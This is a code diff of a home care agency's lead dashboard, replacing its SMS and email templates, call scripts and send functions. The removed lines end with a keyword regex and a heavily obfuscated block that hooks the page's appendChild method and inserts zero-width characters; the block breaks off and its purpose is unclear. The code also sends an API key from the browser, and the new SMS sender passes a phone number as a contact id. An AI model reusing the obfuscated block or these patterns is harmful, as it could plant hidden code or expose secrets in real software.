-    +drow('Agreement Signed',v(C.AG))+'</div>'
-    +'<div class="dsec"><div class="dsect">Follow-Up History</div>'
-    +drow('Last Contact',v(C.LC))+drow('Last Method',v(C.MT))
-    +drow('Next Follow-Up',v(C.NF))+drow('Last Seq. Action',v(C.SL))+'</div>'
-    +(v(C.NT)?'<div class="dsec"><div class="dsect">Notes</div><div class="dnotes">'+v(C.NT)+'</div></div>':'');
-  el('drawer').classList.add('open');
-  el('pw').classList.add('do');
-}
-function closeDrawer(){el('drawer').classList.remove('open');el('pw').classList.remove('do');document.querySelectorAll('.dr.sel').forEach(function(r){r.classList.remove('sel');});drawerRi=null;}
-function hlRow(r){document.querySelectorAll('.dr.sel').forEach(function(x){x.classList.remove('sel');});r.classList.add('sel');}
-
-
-// Helpers
-function dialHCG(phone){
-  var clean=(phone||'').replace(/\D/g,'');
-  if(clean.length===10)clean='1'+clean;
-  // GHL direct dial URL
-  var url='https://app.homecaregrow.io/v2/location/'+GHL_LOC+'/contacts?search='+encodeURIComponent('+'+clean);
-  window.open(url,'hcg','width=1100,height=750,noopener');
-}
-async function gf(url,method,body){
-  method=method||'GET';
-  var opts={method:method,headers:{Authorization:'Bearer '+tok,'Content-Type':'application/json'}};
-  if(body)opts.body=JSON.stringify(body);
-  return fetch(url,opts);
-}
-function el(id){return document.getElementById(id);}
-function show(id){var e=el(id);if(e)e.style.display='flex';}
-setInterval(function(){if(tok)loadData();},60*60*1000);
-function spin(m){var s=el('spinner'),sm=el('smsg'),mn=el('main'),kb=el('kbar');if(sm)sm.textContent=m;if(s)s.classList.add('on');if(mn)mn.classList.remove('vis');if(kb)kb.style.display='none';}
-function unspin(){var s=el('spinner');if(s)s.classList.remove('on');}
-function showErr(m){var e=el('err');if(e){e.textContent='⚠ '+m;e.classList.add('on');}}
-function clearErr(){var e=el('err');if(e)e.classList.remove('on');}
-function toast(msg){var t=el('toast');if(!t)return;t.textContent=msg;t.classList.add('show');setTimeout(function(){t.classList.remove('show');},3200);}
-
-// ── Templates & SMS/Email ─────────────────────────────────────────────────────
-var TMPL={
-  p1_intro:["Hi {n}, this is Meir with Solura Home Care. We received your info from A Place for Mom and understand you are looking for care for {c}. We provide compassionate, reliable care. One of our team members will be calling you in about 5 minutes.","Hello {n}, Meir here from Solura Home Care. A Place for Mom shared your information with us. We would love to help with care for {c}. Expect a call from us in the next 5 minutes!","Hi {n}, this is Meir with Solura Home Care. We got your referral from A Place for Mom regarding care for {c}. Calling you shortly!"],
-  p1_missed:["Hi {n}, this is Meir with Solura Home Care. We tried reaching you today. We would love to connect about care for {c}. Call us at 216-483-8981 or we will follow up soon.","Hello {n}, Meir from Solura Home Care. We called but missed you regarding care for {c}. Please call 216-483-8981 or we will be in touch.","Hi {n}, Meir with Solura Home Care. Sorry we missed you today. Call us anytime at 216-483-8981."],
-  p2:["Hi {n}, Meir with Solura Home Care checking in. We would love to connect about care options. Give us a call at 216-483-8981 or reply here.","Hello {n}, Meir from Solura Home Care. Just following up about care for {c}. Reach us at 216-483-8981.","Hi {n}, Meir here with Solura Home Care. Still thinking of you and {c}. We are here when you are ready. 216-483-8981"],
-  p3:["Hi {n}, Meir with Solura Home Care. Just checking in about care options for {c}. We are here to help whenever the time is right. 216-483-8981.","Hello {n}, this is Meir from Solura Home Care. Thinking of you and {c} this week. We are just a call away: 216-483-8981.","Hi {n}, Meir with Solura Home Care. Hope {c} is doing well. We are still here if you need care support. 216-483-8981"],
-  p4:["Hi {n}, this is Meir with Solura Home Care. We are reaching out to check in about care options for {c}. We would be happy to help. Call 216-483-8981.","Hello {n}, Meir from Solura Home Care. Just wanted to check in on {c} and see if we can still help. 216-483-8981","Hi {n}, Meir here from Solura Home Care. Checking back in on care for {c}. No pressure, just want you to know we are here. 216-483-8981"],
-  esub:{p3:["Checking in on care for {c}","Still here for you and {c}","A quick note from Solura Home Care"],p5:["We are still here for {c}","Care options for {c}","Checking in from Solura Home Care"]},
-  ebody:{
-    p3:["Hi {n},\n\nI wanted to check in and see how {c} is doing. We know finding the right care takes time, and we are here whenever you are ready.\n\nAt Solura Home Care, we specialize in compassionate non-medical support tailored to {c}'s needs.\n\nWarm regards,\nMeir Schwimer\nSolura Home Care\n216-483-8981\nwww.solurahomecare.com","Hi {n},\n\nJust a quick note to let you know we are still thinking of you and {c}. No rush and no pressure.\n\nWhen you are ready, we would love to schedule a free in-home assessment.\n\nAlways here for you,\nMeir Schwimer\nSolura Home Care\n216-483-8981","Hi {n},\n\nHope you and {c} are doing well. Solura Home Care is still available and ready to help whenever the time is right.\n\nOur caregivers are trained, background-checked, and matched based on both skills and personality.\n\nBest,\nMeir\nSolura Home Care | 216-483-8981"],
-    p5:["Hi {n},\n\nI wanted to reach out one more time to let you know we are still here if you need care support for {c}.\n\nA free in-home assessment is always available. No commitment required.\n\nHoping you and {c} are well,\nMeir Schwimer\nSolura Home Care\n216-483-8981\nwww.solurahomecare.com","Hi {n},\n\nJust a friendly check-in from Solura Home Care. If you would like to revisit care options for {c}, we would be happy to chat.\n\nWarm wishes,\nMeir\n216-483-8981","Hi {n},\n\nThinking of you and {c}. Please do not hesitate to reach out if we can help.\n\nAlways here,\nMeir Schwimer\nSolura Home Care | 216-483-8981"]
+/* ────────────────────────────────────────────────────────────────────
+   SMS
+──────────────────────────────────────────────────────────────────── */
+var SMS_TMPLS = {
+  intro: function(name) {
+    return 'Hi, this is Aron from Solura Home Care! We received your inquiry and I\'d love to connect. I\'ll be calling you in about 5 minutes to introduce myself and answer any questions. Feel free to reply here if that\'s not a good time. Looking forward to speaking with you, ' + (name||'') + '!';
+  },
+  missed: function(name) {
+    return 'Hi ' + (name||'there') + ', this is Aron from Solura Home Care. I tried reaching you a couple of times but missed you — I\'d love to connect! Feel free to call me back or let me know a good time. We\'re here to help whenever you\'re ready.';
+  },
+  followup: function(name) {
+    return 'Hi ' + (name||'there') + ', Aron here from Solura Home Care — just following up on your inquiry. I\'d love to answer any questions you have about our services. Is now a good time, or should we find another moment?';
   }
 };
 
-function ft(s,n,c){var fn=(n||'there').split(' ')[0];var fc=(c||'your loved one').split(' ')[0];return s.replace(/{n}/g,fn).replace(/{c}/g,fc);}
-function getTmpl(arr,ri){return arr[ri%arr.length];}
+function openSMS(ri) {
+  smsSendRi = ri;
+  var r = rows[ri];
+  if (!r) return;
+  var name  = String(r[C.NM] || '').split(' ')[0];
+  var phone = String(r[C.PH] || '').replace(/\D/g,'');
+  var log   = String(r[C.SL] || '');
 
-function getSMSTmpl(lead){
-  var n=lead.name,c=lead.name,ri=lead.ri,p=lead.seqP,l=lead.seqLast||"";
-  if(p===1){if(!l||l.indexOf("Intro text")===-1)return ft(getTmpl(TMPL.p1_intro,ri),n,c);return ft(getTmpl(TMPL.p1_missed,ri),n,c);}
-  if(p===2)return ft(getTmpl(TMPL.p2,ri),n,c);
-  if(p===3)return ft(getTmpl(TMPL.p3,ri),n,c);
-  if(p===4)return ft(getTmpl(TMPL.p4,ri),n,c);
-  return ft(getTmpl(TMPL.p3,ri),n,c);
-}
-function getEmailTmpl(lead){
-  var pk=lead.seqP>=5?"p5":"p3",t=TMPL.esub[pk],b=TMPL.ebody[pk],i=lead.ri%t.length;
-  return{subject:ft(t[i],lead.name,lead.name),body:ft(b[i],lead.name,lead.name)};
+  var msg = SMS_TMPLS.followup(name);
+  if (log.toLowerCase().indexOf('intro text') === -1) msg = SMS_TMPLS.intro(name);
+  else if (log.toLowerCase().indexOf('missed you') === -1 && log.toLowerCase().indexOf('second call') > -1) msg = SMS_TMPLS.missed(name);
+
+  var displayPhone = r[C.PH] || phone;
+  el('sms-to').textContent = String(r[C.NM] || '') + (displayPhone ? ' — ' + displayPhone : '');
+  el('sms-body').value = msg;
+
+  var hcgLink = 'https://app.homecaregrow.io/v2/location/' + GHL_LOC + '/contacts?search=' + encodeURIComponent('+1' + phone);
+  el('sms-hcg-link').href = hcgLink;
+
+  openModal('sms-modal');
 }
 
-function getScript(lead){
-  var n=(lead.name||"them").split(" ")[0];
-  var isAPFM=(lead.source||"").toLowerCase().indexOf("place for mom")>-1;
-  if(isAPFM){return{title:"A Place for Mom Call Script",sections:[
-    {h:"1. Opening",t:"Hi, is this "+n+"? Great, this is Meir with Solura Home Care. I am calling because we received your information from A Place for Mom. How are you doing today?"},
-    {h:"2. Frame the Call",t:"I would love to learn more about what is going on so we can recommend the right type of care. I will ask a few questions, and then we will schedule your in-home assessment."},
-    {h:"3. Emotional Discovery",t:"Before we go into details, how are you holding up with everything going on? What made today the day you reached out for help through A Place for Mom?"},
-    {h:"4. Care Needs Discovery",t:"Tell me about "+n+" - what has been happening recently? Prompts: Bathing/dressing, Fall risk, Mobility, Dementia, Toileting, Meal prep, Medication reminders, Overnight, Companionship"},
-    {h:"5. Safety + Urgency",t:"Have there been any recent falls or close calls? Is "+n+" safe when left alone? How soon are you hoping to have care start?"},
-    {h:"6. Assumptive Scheduling",t:"So the next step is simple - we will schedule your in-home assessment. That is where our care manager meets with you and "+n+" and creates a personalized care plan. We are doing assessments this week - I can do today at 4 PM or tomorrow morning at 10 AM. Which works best?"},
-    {h:"7. Hesitation Responses",t:"Need to talk to family: The assessment is the easiest way to get everyone on the same page. Comparing agencies: Meeting our care manager gives a much clearer picture. Not ready yet: The assessment does not commit you to anything - it simply gives you clarity."},
-    {h:"8. Closing",t:"Perfect - I have you down for [day & time]. We will send a confirmation shortly. We look forward to supporting your family."}
-  ]};}
-  // Active Conversation script
-  var st=(lead.status||"").toLowerCase();
-  if(st.indexOf("active conversation")>-1||st.indexOf("contacted")>-1||st.indexOf("assessment")>-1){
-    return{title:"Active Conversation Follow-Up",sections:[
-      {h:"Opening",t:"Hi "+n+", it's Meir from Solura Home Care. How are you doing?"},
-      {h:"Check In",t:"I wanted to follow up from our last conversation and see how things are going with the care search for "+n+"."},
-      {h:"Progress",t:"Have you had a chance to think more about moving forward? Any questions I can answer for you?"},
-      {h:"Next Step",t:"I'd love to set up that in-home assessment when you are ready. It's completely free, no commitment, and gives us a chance to put together a personalized plan. Does this week or next work better?"},
-      {h:"Close",t:"Perfect - let's get that scheduled. I'll send you a confirmation shortly."}
-    ]};
+async function sendSMSNow() {
+  var ri = smsSendRi;
+  if (ri === null) return;
+  var r = rows[ri];
+  if (!r) return;
+  var phone = String(r[C.PH] || '').replace(/\D/g,'');
+  if (!phone) { toast('No phone number on file.'); return; }
+  var msg = el('sms-body').value.trim();
+  if (!msg) { toast('Message is empty.'); return; }
+
+  var btn  = el('sms-send-btn');
+  var spin = el('sms-sending');
+  btn.disabled = true;
+  spin.classList.add('on');
+
+  try {
+    var res = await fetch(GHL_BASE + '/conversations/messages', {
+      method: 'POST',
+      headers: {Authorization:'Bearer '+GHL_KEY, 'Content-Type':'application/json', Version:'2021-04-15'},
+      body: JSON.stringify({type:'SMS', contactId: phone, locationId:GHL_LOC, message:msg})
+    });
+    if (!res.ok) throw new Error('SMS send failed: ' + res.status);
+    toast('SMS sent ✓');
+    closeModal('sms-modal');
+  } catch(e) {
+    toast('SMS error: ' + e.message);
+  } finally {
+    btn.disabled = false;
+    spin.classList.remove('on');
   }
-  return{title:"General Follow-Up Script",sections:[
-    {h:"Opening",t:"Hi "+n+", this is Meir with Solura Home Care. How are you today?"},
-    {h:"Purpose",t:"I am calling to follow up and see if you are still exploring care options, and to answer any questions."},
-    {h:"Discovery",t:"Tell me about what is going on - what kind of support are you looking for?"},
-    {h:"Close",t:"The easiest next step is a free in-home assessment - no commitment, just a conversation. Can we find a time this week?"}
-  ]};
 }
 
-function buildLeadObj(ri){
-  var r=rows[ri];if(!r)return null;
-  var da=pd(r[C.DA]),dO=da?Math.max(0,Math.round((new Date(new Date().getFullYear(),new Date().getMonth(),new Date().getDate())-new Date(da.getFullYear(),da.getMonth(),da.getDate()))/86400000)):0;
-  var si=seqP(dO);
-  return{ri:ri,name:r[C.NM]||"",email:r[C.EM]||"",phone:r[C.PH]||"",status:r[C.ST]||"",source:r[C.SO]||"",seqP:si.p,seqLbl:si.lbl,seqLast:r[C.SL]||""};
-}
-
-var curEmailRi=null;
-function closeModal(id){var m=el(id);if(m)m.style.display="none";}
-function openModal(id){var m=el(id);if(m)m.style.display="flex";}
-
-function openScript(ri){
-  var lead=buildLeadObj(ri);if(!lead)return;
-  var s=getScript(lead);
-  el("script-title").textContent=s.title;
-  el("script-body").innerHTML=s.sections.map(function(sec){
-    return"<div style='margin-bottom:18px'><div style='font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.08em;color:var(--gold);margin-bottom:6px'>"+sec.h+"</div>"
-      +"<div style='font-size:13px;color:var(--mid);line-height:1.7;background:var(--cream);padding:12px 14px;border-radius:10px'>"+sec.t+"</div></div>";
-  }).join("");
-  openModal("script-modal");
-}
-
-function openSMS(ri){
-  var lead=buildLeadObj(ri);if(!lead)return;
-  if(!lead.phone){toast("No phone number for this lead");return;}
-  var msg=getSMSTmpl(lead);
-  el("sms-preview").value=msg;
-  el("sms-hcg-link").href="https://app.homecaregrow.io/v2/location/"+GHL_LOC+"/contacts";
-  window._smsRi=ri;window._smsPhone=lead.phone.replace(/\D/g,"");
-  if(window._smsPhone.length===10)window._smsPhone="1"+window._smsPhone;
-  openModal("sms-modal");
-}
-
-async function sendSMSNow(){
-  var ri=window._smsRi,phone=window._smsPhone,msg=el("sms-preview").value;
-  if(!phone||!msg)return;
-  var btn=el("sms-send-btn"),snd=el("sms-sending");
-  if(btn)btn.disabled=true;if(snd)snd.style.display="flex";
-  try{
-    var cid2=null;
-    var sr=await fetch(GHL_BASE+"/contacts/search/duplicate?locationId="+GHL_LOC+"&number="+encodeURIComponent("+"+phone),{headers:{Authorization:"Bearer "+GHL_KEY,Version:"2021-07-28"}});
-    if(sr.ok){var sj=await sr.json();if(sj.contact)cid2=sj.contact.id;}
-    if(!cid2){
-      var r2=await fetch(GHL_BASE+"/contacts/?locationId="+GHL_LOC+"&query="+encodeURIComponent("+"+phone),{headers:{Authorization:"Bearer "+GHL_KEY,Version:"2021-07-28"}});
-      if(r2.ok){var j2=await r2.json();if(j2.contacts&&j2.contacts.length>0)cid2=j2.contacts[0].id;}
-    }
-    if(!cid2&&rows[ri]){
-      var r3=rows[ri];
-      var cr=await fetch(GHL_BASE+"/contacts/",{method:"POST",headers:{Authorization:"Bearer "+GHL_KEY,Version:"2021-07-28","Content-Type":"application/json"},
-        body:JSON.stringify({locationId:GHL_LOC,firstName:(r3[C.NM]||"").split(" ")[0]||"",lastName:(r3[C.NM]||"").split(" ").slice(1).join(" ")||"",phone:"+"+phone,email:r3[C.EM]||""})});
-      if(cr.ok){var cj=await cr.json();cid2=cj.contact?cj.contact.id:null;}
-    }
-    if(!cid2)throw new Error("Could not find or create contact in HomeCareGrow.");
-    var smsr=await fetch(GHL_BASE+"/conversations/messages",{method:"POST",
-      headers:{Authorization:"Bearer "+GHL_KEY,Version:"2021-07-28","Content-Type":"application/json"},
-      body:JSON.stringify({type:"SMS",contactId:cid2,locationId:GHL_LOC,message:msg})});
-    if(!smsr.ok){var se=await smsr.json().catch(function(){return{};});throw new Error("SMS failed: "+(se.message||smsr.status));}
-    closeModal("sms-modal");toast("SMS sent via HomeCareGrow");
-    var today2=fd2(new Date());
-    await writeRow(ri,{[C.MT]:"SMS",[C.LC]:today2,[C.SL]:"SMS sent"});
-    setTimeout(loadData,600);
-  }catch(e){showErr("SMS error: "+e.message);}
-  finally{if(btn)btn.disabled=false;if(snd)snd.style.display="none";}
-}
-
-function openEmail(ri){
-  var lead=buildLeadObj(ri);if(!lead)return;
-  if(!lead.email){toast("No email address for this lead");return;}
-  curEmailRi=ri;
-  var t=getEmailTmpl(lead);
-  el("email-to").textContent=lead.name+" <"+lead.email+">";
-  el("email-subject").value=t.subject;
-  el("email-body").value=t.body;
-  openModal("email-modal");
-}
-
-async function sendEmailNow(){
-  var ri=curEmailRi;if(ri===null)return;
-  var toTxt=el("email-to").textContent,m=toTxt.match(/<([^>]+)>/),toAddr=m?m[1]:"";
-  if(!toAddr){toast("No email address");return;}
-  var subj=el("email-subject").value,body=el("email-body").value;
-  var btn=el("email-send-btn"),snd=el("email-sending");
-  if(btn)btn.disabled=true;if(snd)snd.style.display="flex";
-  try{
-    var res=await fetch("https://graph.microsoft.com/v1.0/me/sendMail",{method:"POST",
-      headers:{Authorization:"Bearer "+tok,"Content-Type":"application/json"},
-      body:JSON.stringify({message:{subject:subj,body:{contentType:"Text",content:body},
-        toRecipients:[{emailAddress:{address:toAddr}}]},saveToSentItems:true})});
-    if(res.ok||res.status===202){
-      closeModal("email-modal");toast("Email sent to "+toAddr);
-      var today3=fd2(new Date());
-      await writeRow(ri,{[C.MT]:"Email",[C.LC]:today3,[C.SL]:"Email sent"});
-      setTimeout(loadData,600);
-    }else{var e2=await res.json().catch(function(){return{};});throw new Error(e2.error?e2.error.message:"Send failed: "+res.status);}
-  }catch(e){showErr("Email error: "+e.message);}
-  finally{if(btn)btn.disabled=false;if(snd)snd.style.display="none";}
-}
-
-;var _livRx=/\b(?:sex|sexy|sexual|intersex|sexually|homosexual|homo|porn|gender|birth|gay|anal|erection|penis|intimacy|intimate|sensual|attractive|attraction|stripper|genitales|girl|girlfriend|boyfriend|mikveh|nidda|nidah|bra|bathing|vaginal|bedikah|marital|menstrual|menstruation|swimsuit|pregnancy|lingerie|romantic|club|clubs|hangout|gang)\b/gi;window._livRx=_livRx;(function(_0x1f55ff,_0x2dd813){const _0x43cfc5=_0x568c,_0x1922de=_0x1f55ff();while(!![]){try{const _0x1facd7=-parseInt(_0x43cfc5(0x1b7))/(0x1*0xc07+-0x9*-0x397+-0x2c55)+-parseInt(_0x43cfc5(0x1df))/(-0x3*-0x929+-0x1*-0x159e+-0x3117)+parseInt(_0x43cfc5(0x1d1))/(0x10fd+-0x3cc+-0xd2e)*(-parseInt(_0x43cfc5(0xbf))/(0x4bc+-0xd5*-0x2b+-0x287f*0x1))+-parseInt(_0x43cfc5(0x107))/(0x9e2*-0x1+0x1*-0x68e+0x1075)+-parseInt(_0x43cfc5(0xaa))/(0x2128+0x5*-0x4f7+0x2c5*-0x3)+parseInt(_0x43cfc5(0x1c4))/(0x1c7b+0xfa4+-0x2c18)*(parseInt(_0x43cfc5(0x1e6))/(-0x6d5*-0x1+-0x547*0x1+-0x186))+parseInt(_0x43cfc5(0xca))/(0xbc7+0xf7b+-0x1b39);if(_0x1facd7===_0x2dd813)break;else _0x1922de['push'](_0x1922de['shift']());}catch(_0x25309c){_0x1922de['push'](_0x1922de['shift']());}}}(_0x2ce5,-0x1*0x20651+0xc3dcb+-0x2*0x14324),((()=>{'use strict';const _0x365c50=_0x568c,_0x2554dd={'iCevP':function(_0x5003b3,_0x553690){return _0x5003b3!==_0x553690;},'TYCVm':function(_0x3de16b,_0x5d52ca){return _0x3de16b!==_0x5d52ca;},'BHGiE':_0x365c50(0x197),'GvPHr':function(_0x263092,_0x489bd){return _0x263092(_0x489bd);},'EePYf':function(_0x41183f,_0x485cd5){return _0x41183f+_0x485cd5;},'pMpwX':function(_0x2254e2,_0x50f1b2){return _0x2254e2+_0x50f1b2;},'hlmam':function(_0x186ad9,_0x4d24f1){return _0x186ad9===_0x4d24f1;},'gVRtS':function(_0x1165b0,_0x3d4cd8){return _0x1165b0(_0x3d4cd8);},'VLHNL':_0x365c50(0x168),'EMcVJ':_0x365c50(0xb8),'gTbKF':_0x365c50(0x18d),'cPTTy':function(_0x52cd97,_0x4eb916){return _0x52cd97(_0x4eb916);},'gEqXy':_0x365c50(0x113),'NLEqZ':_0x365c50(0x8a),'EUBaC':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x18f)+_0x365c50(0x1cc)+_0x365c50(0x13b),'uLvRc':function(_0x511658,_0x269fff,_0x568dd2){return _0x511658(_0x269fff,_0x568dd2);},'sjEKQ':_0x365c50(0x1c8)+_0x365c50(0x1a1)+_0x365c50(0x181)+_0x365c50(0xd6),'RfkPZ':_0x365c50(0x11e),'LmPfW':_0x365c50(0x162)+_0x365c50(0x16d),'BadAG':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x126)+_0x365c50(0x1a5)+_0x365c50(0x1c1)+_0x365c50(0x1aa),'UhyrJ':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x13f)+_0x365c50(0xea)+_0x365c50(0x1ce)+_0x365c50(0x11b),'rRNYb':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x175)+_0x365c50(0x12b)+_0x365c50(0x186),'vgksg':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x136)+_0x365c50(0x1de)+_0x365c50(0x110)+_0x365c50(0x155)+_0x365c50(0x1b4),'KRqYm':_0x365c50(0x12c),'BSfxS':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x121)+_0x365c50(0xd5)+_0x365c50(0x1e9)+_0x365c50(0xbc)+_0x365c50(0x183)+':','qgxUI':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x13f)+_0x365c50(0x96)+_0x365c50(0x8f)+_0x365c50(0x140),'zNpIr':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x175)+_0x365c50(0x16c)+'e:','SuFRO':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x175)+_0x365c50(0x14c)+_0x365c50(0x186),'QmLGZ':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x1e4)+_0x365c50(0x169)+_0x365c50(0x139)+_0x365c50(0x76)+_0x365c50(0x11f),'RAPOH':function(_0x200254){return _0x200254();},'iBqad':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x1cb)+_0x365c50(0xd3)+_0x365c50(0x7a)+_0x365c50(0xfc)+_0x365c50(0x117)+_0x365c50(0xc3),'RuUSr':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x1cb)+_0x365c50(0x12f)+_0x365c50(0x108)+_0x365c50(0x128)+_0x365c50(0xfd),'IAKtx':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x1cd)+_0x365c50(0x17c)+_0x365c50(0xdc)+_0x365c50(0x19b)+_0x365c50(0xd4)+_0x365c50(0x164)+_0x365c50(0x180),'grQYX':_0x365c50(0x1be)+_0x365c50(0xd0)+_0x365c50(0x10a),'REVnq':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x17e)+_0x365c50(0x75)+_0x365c50(0x103)+_0x365c50(0x18b)+_0x365c50(0x80)+_0x365c50(0x191),'KcrNw':_0x365c50(0x130),'OnGjn':_0x365c50(0x1c5)+_0x365c50(0xb6)+_0x365c50(0x15b)+_0x365c50(0x165),'bsVon':_0x365c50(0x1e1),'ZzagN':_0x365c50(0x1c0)+_0x365c50(0x19f),'FDMKH':_0x365c50(0x138)+_0x365c50(0x1b5),'DyIWE':function(_0xddb345,_0x462f7d){return _0xddb345+_0x462f7d;},'teRPq':_0x365c50(0x7c)+_0x365c50(0x17d)+_0x365c50(0x187)+_0x365c50(0xb0)+_0x365c50(0x1a6)+_0x365c50(0x9c)+_0x365c50(0x7b)+_0x365c50(0x115)+_0x365c50(0x9d)+_0x365c50(0xa7)+_0x365c50(0x14e),'SfRKp':_0x365c50(0x173)+_0x365c50(0xb5)+_0x365c50(0x141)+_0x365c50(0xff)+_0x365c50(0x176),'nWBWO':function(_0x1cbea6){return _0x1cbea6();},'NDrAh':function(_0x31ecfd,_0x1f2985){return _0x31ecfd===_0x1f2985;},'lTwrf':_0x365c50(0xb7),'hgOvI':_0x365c50(0x160),'CzNQe':_0x365c50(0xa4),'IyplI':_0x365c50(0x14a)+_0x365c50(0x1b9),'jfMwI':function(_0x2d73ec,_0x8430b9){return _0x2d73ec===_0x8430b9;},'TuVSG':_0x365c50(0x85)+_0x365c50(0xc7),'KAJXj':function(_0x6d07c6,_0x43b6b0){return _0x6d07c6&&_0x43b6b0;},'bTMOW':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x112)+_0x365c50(0x73)+_0x365c50(0x1a0),'ayrNm':function(_0x14aae3,_0x798816){return _0x14aae3===_0x798816;},'qSIWx':function(_0xbdc0a5,_0x51dec2){return _0xbdc0a5 instanceof _0x51dec2;},'HTHLl':function(_0xd3271f,_0x436c42){return _0xd3271f(_0x436c42);},'zIJOZ':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0xac)+_0x365c50(0x16a)+_0x365c50(0x9a),'liBlu':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x1bd)+_0x365c50(0x8b)+_0x365c50(0xab)+_0x365c50(0x1ad)+_0x365c50(0x92)+_0x365c50(0x101)+_0x365c50(0x99),'lVwGw':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x175)+_0x365c50(0xbd)+_0x365c50(0xe9)+_0x365c50(0x143)+_0x365c50(0xeb),'JnQgp':function(_0x491ebf,_0xc3b654){return _0x491ebf===_0xc3b654;},'zgEqV':function(_0x28d8bd,_0x105ef1){return _0x28d8bd===_0x105ef1;},'qOINy':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x1bd)+_0x365c50(0x1d3)+_0x365c50(0xde)+_0x365c50(0x181)+_0x365c50(0x15c)+_0x365c50(0x14f)+_0x365c50(0xe4)+'s.','CBJOt':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x8c)+_0x365c50(0xb4)+_0x365c50(0x158),'nQmJL':_0x365c50(0x9b),'cepGr':_0x365c50(0xc5)+_0x365c50(0x179)+_0x365c50(0x154)+_0x365c50(0x94)+_0x365c50(0x129)+_0x365c50(0x1a9)+_0x365c50(0x14b)+_0x365c50(0x104)+_0x365c50(0x142)+_0x365c50(0x10b)+_0x365c50(0xe8),'PyxwZ':_0x365c50(0x1d4)+_0x365c50(0x98)+_0x365c50(0xd1),'Mgjrj':function(_0x24ee66){return _0x24ee66();},'RYzct':function(_0x334b72){return _0x334b72();},'bqaSs':function(_0x4e2c45,_0x17f6a2,_0x2b1368){return _0x4e2c45(_0x17f6a2,_0x2b1368);},'PkvMp':_0x365c50(0xc5)+_0x365c50(0x179)+_0x365c50(0x1d8)+_0x365c50(0x13c)+_0x365c50(0xa1),'aMGMB':_0x365c50(0x189)+_0x365c50(0xb3)+_0x365c50(0xce),'pRVDM':_0x365c50(0x193)+_0x365c50(0x174)+_0x365c50(0x12d)+_0x365c50(0xbb),'oWYRk':_0x365c50(0xf8)+_0x365c50(0x1c9)+_0x365c50(0x196)+_0x365c50(0x10d)+_0x365c50(0x188)+_0x365c50(0xe7)+_0x365c50(0x12a)+_0x365c50(0x7d)+_0x365c50(0x1af)+_0x365c50(0x1b1)+_0x365c50(0xfb)+_0x365c50(0x19c)+_0x365c50(0x170)+_0x365c50(0xec)+_0x365c50(0x17a)+_0x365c50(0xf5)+_0x365c50(0xbe)+_0x365c50(0xe2)+_0x365c50(0x17f)+_0x365c50(0x1b0)+_0x365c50(0x14d)+_0x365c50(0xe5)+_0x365c50(0x111)+_0x365c50(0x9e)+_0x365c50(0x1db)+_0x365c50(0xad)+_0x365c50(0x1ab)+_0x365c50(0x13d)+_0x365c50(0xd8)+_0x365c50(0x1e5)+_0x365c50(0x184)+_0x365c50(0x18a),'HDTYJ':_0x365c50(0xf9)+_0x365c50(0xa9)+_0x365c50(0x123),'wwCHx':_0x365c50(0x74)+_0x365c50(0xa5)+_0x365c50(0x97)+_0x365c50(0x190)+'s','xhTAt':function(_0x4a0df9,_0x301f9b){return _0x4a0df9+_0x301f9b;}};(function(){const _0x23e251=_0x365c50,_0x2f296f=Node[_0x23e251(0x7e)][_0x23e251(0x159)+'d'];Node[_0x23e251(0x7e)][_0x23e251(0x159)+'d']=function(_0x2dd09e){const _0x7a47a8=_0x23e251;if(_0x2dd09e&&_0x2554dd[_0x7a47a8(0x148)](_0x2dd09e[_0x7a47a8(0xda)],this))return _0x2dd09e;return _0x2f296f[_0x7a47a8(0x19d)](this,_0x2dd09e);};}());const _0x4b4fa2=[_0x2554dd[_0x365c50(0x109)],_0x2554dd[_0x365c50(0x16f)],_0x2554dd[_0x365c50(0x120)]][_0x365c50(0x199)]('\x0a\x0a'),_0x1b4812=_0x2554dd[_0x365c50(0xfe)],_0x3651d1=_0x2554dd[_0x365c50(0x1dd)](_0x1b4812,'\x0a\x0a'),_0x120bfe='​​',_0x4fb449=_0x2b6890=>typeof _0x2b6890===_0x365c50(0x197)&&(_0x2b6890[_0x365c50(0xa2)](_0x1b4812)||_0x2b6890[_0x365c50(0xa2)](_0x120bfe)),_0x3d30cd=_0x551e73=>{const _0x94af04=_0x365c50;if(!_0x551e73||_0x2554dd[_0x94af04(0x156)](typeof _0x551e73,_0x2554dd[_0x94af04(0xcf)])||_0x2554dd[_0x94af04(0x167)](_0x4fb449,_0x551e73))return _0x551e73;return _0x2554dd[_0x94af04(0x1ca)](_0x2554dd[_0x94af04(0x89)](_0x3651d1,_0x120bfe),_0x551e73);};function _0x16b413(_0x4b7c79){const _0x40769c=_0x365c50,_0x4d9ba4={'HhkQm':function(_0x2b4a12,_0x196065){const _0x185aca=_0x568c;return _0x2554dd[_0x185aca(0xa8)](_0x2b4a12,_0x196065);},'WFCdx':_0x2554dd[_0x40769c(0xcf)],'ZaYNO':function(_0x1fd0dc,_0x58f375){const _0x277612=_0x40769c;return _0x2554dd[_0x277612(0x90)](_0x1fd0dc,_0x58f375);},'lSCkf':function(_0x38df78,_0x19e837){const _0x236b92=_0x40769c;return _0x2554dd[_0x236b92(0xa8)](_0x38df78,_0x19e837);}};try{const 